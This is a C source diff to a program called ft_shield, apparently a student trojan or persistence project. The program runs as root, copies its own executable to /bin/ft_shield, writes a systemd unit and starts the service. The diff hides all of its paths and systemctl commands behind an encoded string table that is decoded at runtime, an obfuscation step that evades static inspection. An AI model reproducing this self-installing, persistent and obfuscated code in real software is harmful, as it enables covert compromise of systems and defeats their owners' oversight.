@@ -1,9 +1,11 @@
+#include "constants.h"
 #include "digest.h"
 #include "mem.h"
 #include "shield.h"
 #include <errno.h>
 #include <fcntl.h>
 #include <stdbool.h>
+#include <stddef.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -14,7 +16,7 @@
 
 static int
 generate_binary() {
-    const char *src_path = "/proc/self/exe", *target_path = "/bin/ft_shield";
+    const char *src_path = (char *)strings[PROC_SELF_EXE].data, *target_path = (char *)strings[BIN_FT_SHIELD].data;
     int src_fd = open(src_path, O_RDONLY);
     if (src_fd == -1) {
         __log(stderr, "(open [path %s]) Error: %s\n", src_path, strerror(errno));
@@ -58,21 +60,25 @@ generate_binary() {
 
 int
 configure_systemd(char *const activation_key) {
-    int fd = open(SYSTEMD_CONFIG_PATH, O_TRUNC | O_CREAT | O_WRONLY, 0644);
+    const char *systemd_config_path = (const char *)strings[SYSTEMD_CONFIG_PATH].data;
+    int fd = open(systemd_config_path, O_TRUNC | O_CREAT | O_WRONLY, 0644);
     if (fd == -1) {
-        __log(stderr, "(open [path %s]) Error: %s\n", SYSTEMD_CONFIG_PATH, strerror(errno));
+        __log(stderr, "(open [path %s]) Error: %s\n", systemd_config_path, strerror(errno));
         return -1;
     }
 
+    const char *systemd_config = (const char *)strings[SYSTEMD_CONFIG].data;
     // 64 bytes activation key will be inserted into SYSTEMD_CONFIG, -2 for %s
-    char buf[sizeof(SYSTEMD_CONFIG) + ACTIVATION_KEY_LEN - 2];
-    snprintf(buf, sizeof(buf), SYSTEMD_CONFIG, activation_key);
+    const ssize_t buf_len = strings[SYSTEMD_CONFIG].len + ACTIVATION_KEY_LEN - 2;
+    // VLA I know, but the value is guaranteed to be max 278, which is fine for the 8MB stack.
+    char buf[buf_len];
+    snprintf(buf, sizeof(buf), systemd_config, activation_key);
 
-    if (write(fd, buf, sizeof(buf)) != sizeof(buf)) {
+    if (write(fd, buf, buf_len) != buf_len) {
         if (errno != 0) {
-            __log(stderr, "(write [path %s] [fd %d]) Error: %s\n", SYSTEMD_CONFIG_PATH, fd, strerror(errno));
+            __log(stderr, "(write [path %s] [fd %d]) Error: %s\n", systemd_config_path, fd, strerror(errno));
         } else {
-            __log(stderr, "(write [path %s] [fd %d]) Unknown error\n", SYSTEMD_CONFIG_PATH, fd);
+            __log(stderr, "(write [path %s] [fd %d]) Unknown error\n", systemd_config_path, fd);
         }
         close(fd);
         return -1;
@@ -86,13 +92,13 @@ int
 start_service() {
     // If the service was already running and the configuration changed, 'systemctl start' outputs a warning message.
     // 'systemctl daemon-reload' prevents this by reloading units before starting ft_shield.
-    const char *reload_cmd = "systemctl daemon-reload";
+    const char *reload_cmd = (char *)strings[SYSTEMCTL_DAEMON_RELOAD].data;
     if (system(reload_cmd) == -1) {
         __log(stderr, "(system [cmd %s]) Error: %s\n", reload_cmd, strerror(errno));
         return -1;
     }
 
-    const char *start_cmd = "systemctl start ft_shield";
+    const char *start_cmd = (char *)strings[SYSTEMCTL_START_FT_SHIELD].data;
     if (system(start_cmd) == -1) {
         __log(stderr, "(system [cmd %s]) Error: %s\n", start_cmd, strerror(errno));
         return -1;
@@ -102,7 +108,7 @@ start_service() {
 
 int
 disable_service() {
-    const char *disable_command = "systemctl stop ft_shield";
+    const char *disable_command = (char *)strings[SYSTEMCTL_STOP_FT_SHIELD].data;
     if (system(disable_command) == -1) {
         __log(stderr, "(system [cmd %s]) Error: %s\n", disable_command, strerror(errno));
         return -1;
@@ -112,7 +118,7 @@ disable_service() {
 
 int
 get_activation_key(char *const out) {
-    const char *key_src = "/proc/self/exe";
+    const char *key_src = (char *)strings[PROC_SELF_EXE].data;
     int fd = open(key_src, O_RDONLY);
     if (fd == -1) {
         __log(stderr, "(open [path %s]) Error: %s\n", key_src, strerror(errno));
@@ -146,6 +152,9 @@ main(int ac, char **av, char **env) {
         fprintf(stderr, "Error: ft_shield must be ran as root\n");
         return 1;
     }
+
+    decode_strings(strings, sizeof(strings) / sizeof(strings[0]));
+    __log(stdout, "Decoded strings\n");
 
     char activation_key[ACTIVATION_KEY_LEN + 1] = {0};
     if (get_activation_key(activation_key) == -1) {
